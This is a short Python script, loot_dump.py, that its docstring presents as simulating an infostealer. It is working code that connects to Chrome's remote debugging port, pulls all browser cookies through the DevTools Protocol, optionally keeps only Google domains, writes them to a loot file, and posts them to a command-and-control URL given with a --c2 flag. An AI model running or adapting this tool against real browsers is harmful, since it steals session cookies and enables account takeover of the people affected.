#!/usr/bin/env python3
"""
loot_dump.py -- Dump Chrome cookies via Chrome DevTools Protocol (CDP).
Simulates the capability of an infostealer with code execution on the victim machine.
For testing, launch Chrome with:
    google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-debug
Usage: python3 loot_dump.py --c2 http://<C2_IP>:8443/collect
"""
import argparse, json
import requests
import websocket

def dump(port):
    tabs = requests.get(f"http://localhost:{port}/json", timeout=5).json()
    page = next(t for t in tabs if t["type"] == "page")
    ws = websocket.create_connection(page["webSocketDebuggerUrl"], timeout=15)
    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
    return json.loads(ws.recv())["result"]["cookies"]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=9222, help="Chrome CDP port")
    ap.add_argument("--out", default="loot.json")
    ap.add_argument("--c2", help="Exfiltration URL, e.g. http://192.168.56.10:8443/collect")
    ap.add_argument("--google-only", action="store_true", help="Keep only google domains")
    a = ap.parse_args()

    cookies = dump(a.port)
    if a.google_only:
        cookies = [c for c in cookies if "google" in c["domain"]]
    with open(a.out, "w") as f:
        json.dump(cookies, f, indent=2)
    print(f"[+] {len(cookies)} cookies saved -> {a.out}")
    for c in cookies:
        print(f"    - {c['name']:25s} {c['domain']}")

    if a.c2:
        r = requests.post(a.c2, data=json.dumps(cookies), timeout=10)
        print(f"[+] Exfiltrated to {a.c2} (HTTP {r.status_code})")

if __name__ == "__main__":
    main()
